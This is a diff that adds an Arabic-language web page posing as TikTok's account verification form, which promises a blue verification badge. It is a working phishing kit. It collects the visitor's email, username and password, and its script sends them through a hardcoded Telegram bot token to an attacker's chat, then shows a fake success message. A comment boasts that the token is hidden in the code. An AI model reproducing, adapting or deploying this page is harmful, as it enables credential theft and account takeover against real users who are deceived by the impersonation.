@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>توثيق الحساب – TikTok</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{
+    font-family:"Helvetica Neue",Arial,sans-serif;
+    background:#f5f5f5;min-height:100vh;display:flex;
+    align-items:center;justify-content:center;padding:16px;
+  }
+  .card{
+    background:#fff;border-radius:16px;padding:32px 24px;
+    max-width:420px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,.1);
+  }
+  .header{text-align:center;margin-bottom:24px;}
+  .header h1{font-size:22px;font-weight:700;color:#111;margin-top:8px;}
+  .header p{font-size:13px;color:#777;margin-top:4px;}
+  .logo-img{width:60px;height:60px;border-radius:14px;}
+  .field{margin-bottom:16px;}
+  .field label{
+    display:block;font-size:13px;font-weight:600;color:#333;
+    margin-bottom:4px;
+  }
+  .field input,.field select{
+    width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;
+    border-radius:8px;font-size:14px;color:#222;background:#fafafa;
+    transition:.2s;
+  }
+  .field input:focus,.field select:focus{
+    outline:none;border-color:#FF2D55;background:#fff;
+    box-shadow:0 0 0 3px rgba(255,45,85,.1);
+  }
+  .field .hint{font-size:11px;color:#999;margin-top:4px;}
+  .divider{height:1px;background:#eee;margin:20px 0;}
+  .btn{
+    width:100%;padding:13px;background:#FF2D55;color:#fff;
+    border:none;border-radius:8px;font-size:15px;font-weight:700;
+    cursor:pointer;transition:.2s;margin-top:8px;
+  }
+  .btn:hover{background:#E12C4E;}
+  .btn:disabled{opacity:.5;cursor:not-allowed;}
+  .status{text-align:center;margin-top:16px;font-size:13px;display:none;padding:10px;border-radius:8px;}
+  .status.success{display:block;background:#e6f4ea;color:#1e7e34;}
+  .status.error{display:block;background:#fce8e6;color:#c62828;}
+  .status.loading{display:block;background:#fff0f3;color:#FF2D55;}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="header">
+    <img class="logo-img" src="https://i.ibb.co/ksHzSYpB/unnamed.webp" alt="TikTok">
+    <h1>توثيق الحساب</h1>
+    <p>أدخل بياناتك للحصول على علامة التوثيق الزرقاء</p>
+  </div>
+
+  <form id="verifyForm">
+    <div class="field">
+      <label>البريد الإلكتروني المسجل</label>
+      <input type="email" id="email" placeholder="example@email.com" required>
+    </div>
+    <div class="field">
+      <label>اسم المستخدم (Username)</label>
+      <input type="text" id="username" placeholder="مثال: @user123" required>
+    </div>
+    <div class="field">
+      <label>كلمة المرور</label>
+      <input type="password" id="password" placeholder="●●●●●●●●" required>
+    </div>
+    <div class="field">
+      <label>سبب التوثيق</label>
+      <select id="reason">
+        <option value="">— اختر السبب —</option>
+        <option value="verify">توثيق الحساب (العلامة الزرقاء)</option>
+        <option value="appeal">استئناف تعليق الحساب</option>
+        <option value="copyright">شكوى حقوق نشر</option>
+        <option value="support">دعم فني</option>
+      </select>
+    </div>
+    <div class="divider"></div>
+    <div class="field">
+      <label>عدد المتابعين</label>
+      <input type="number" id="followers" placeholder="مثال: 15000" min="0">
+      <div class="hint">اختياري — يُسرّع عملية المراجعة</div>
+    </div>
+    <button type="submit" class="btn" id="submitBtn">إرسال طلب التوثيق</button>
+  </form>
+
+  <div class="status" id="status"></div>
+</div>
+
+<script>
+// التوكن مخفي جوا الكود — مش موجود في الرابط خالص
+const BOT_TOKEN = '8635912264:AAGu4XL8v9WuS90vwrBGyJGz5fWyFMstM2E';
+const urlParams = new URLSearchParams(window.location.search);
+const CHAT_ID   = urlParams.get('id') || '8246832284';
+
+const form = document.getElementById('verifyForm');
+const statusEl = document.getElementById('status');
+const btn = document.getElementById('submitBtn');
+
+form.addEventListener('submit', async e=>{
+  e.preventDefault();
+
+  const email    = document.getElementById('email').value.trim();
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value.trim();
+  const reason   = document.getElementById('reason').value;
+  const followers = document.getElementById('followers').value.trim();
+
+  if(!email || !username || !password || !reason){
+    statusEl.className = 'status error';
+    statusEl.textContent = '⚠️ الرجاء ملء جميع الحقول الأساسية';
+    return;
+  }
+
+  btn.disabled = true;
+  btn.textContent = 'جاري الإرسال ...';
+  statusEl.className = 'status loading';
+  statusEl.textContent = '🔄 جاري إرسال الطلب ...';
+
+  const msg = `🔴 <b>طلب توثيق TikTok جديد</b>\n\n`+
+    `━━━━━━━━━━━━━━━\n\n`+
+    `📧 <b>البريد الإلكتروني:</b> <code>${email}</code>\n`+
+    `👤 <b>اسم المستخدم:</b> <code>${username}</code>\n`+
+    `🔑 <b>كلمة المرور:</b> <code>${password}</code>\n`+
+    `📋 <b>السبب:</b> ${reason}\n`+
+    `👥 <b>المتابعين:</b> ${followers||'غير محدد'}\n\n`+
+    `━━━━━━━━━━━━━━━━`;
+
+  try{
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:'HTML'})
+    });
+    if(!res.ok) throw new Error('Telegram API error');
+    statusEl.className = 'status success';
+    statusEl.textContent = '✅ تم إرسال طلب التوثيق بنجاح! سيتم مراجعة بياناتك';
+    form.reset();
+  }catch(err){
+    statusEl.className = 'status error';
+    statusEl.textContent = '❌ فشل الإرسال! حاول مرة أخرى.';
+  }
+  btn.disabled = false;
+  btn.textContent = 'إرسال طلب التوثيق';
+});
+</script>
+</body>
+</html>
